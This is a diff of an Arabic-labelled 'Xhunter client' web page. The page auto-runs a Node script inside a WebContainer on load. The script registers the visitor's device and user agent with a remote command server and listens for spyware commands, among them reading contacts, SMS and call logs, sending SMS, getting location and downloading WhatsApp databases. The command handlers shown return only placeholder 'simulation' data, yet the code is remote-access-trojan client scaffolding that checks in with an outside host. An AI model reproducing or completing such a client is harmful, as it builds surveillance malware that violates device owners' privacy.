@@ -4,15 +4,58 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>عميل Xhunter</title>
-<script src="/socket.io/socket.io.js"></script>
-<script src="client.js"></script>
 <style>
-body { font-family: Arial, sans-serif; background:#1e1e2f; color:#fff; text-align:center; }
+body { font-family: Arial,sans-serif; background:#1e1e2f; color:#fff; text-align:center; }
 h1 { margin-top: 40px; color:#00ffcc; }
+p { font-size: 1.2em; }
 </style>
 </head>
 <body>
 <h1>عميل Xhunter</h1>
-<p>تم تسجيل الجهاز تلقائيًا وسيتم استقبال الأوامر.</p>
+<p>Node.js سيتم تشغيله داخل WebContainer تلقائيًا عند تحميل الصفحة.</p>
+
+<script type="module">
+import { WebContainer } from "https://cdn.jsdelivr.net/npm/@webcontainer/api@1.0.0/dist/index.js";
+
+(async () => {
+  // تشغيل WebContainer
+  const wc = await WebContainer.boot();
+  console.log("WebContainer جاهز");
+
+  // إنشاء ملف client.js داخل WebContainer
+  await wc.fs.writeFile('/client.js', `
+    import io from 'socket.io-client';
+    const socket = io('https://xhunter-bsos.onrender.com', { transports:['websocket'], reconnection:true });
+
+    const deviceId = 'device_' + Math.floor(Math.random()*10000);
+    const model = navigator.userAgent;
+    socket.emit('join', { id: deviceId, model });
+    console.log('تم تسجيل الجهاز:', deviceId);
+
+    const allowedActions = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase','openUrl','downloadFile'];
+
+    allowedActions.forEach(action => {
+      socket.on(action, (data, callback) => {
+        let result = { id: deviceId, action, data: 'محاكاة بيانات فقط' };
+        if(callback) callback(result);
+        socket.emit(action, result);
+        console.log('تم تنفيذ الأمر:', action);
+      });
+    });
+
+    socket.on('disconnect', reason => console.log('Disconnected:', reason));
+  `);
+
+  // تثبيت socket.io-client داخل WebContainer
+  await wc.spawn('npm', ['install', 'socket.io-client']);
+
+  // تشغيل client.js تلقائيًا
+  const process = await wc.spawn('node', ['/client.js']);
+  process.output.pipeTo(new WritableStream({
+    write(data) { console.log(data); }
+  }));
+})();
+</script>
+
 </body>
 </html>
